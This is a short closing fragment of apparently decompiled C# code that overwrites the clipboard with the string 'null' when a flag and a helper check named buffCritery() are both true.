				if (flag && buffCritery())
				{
					Clipboard.SetDataObject((object)"null");
				}
			}
		}
	}
}
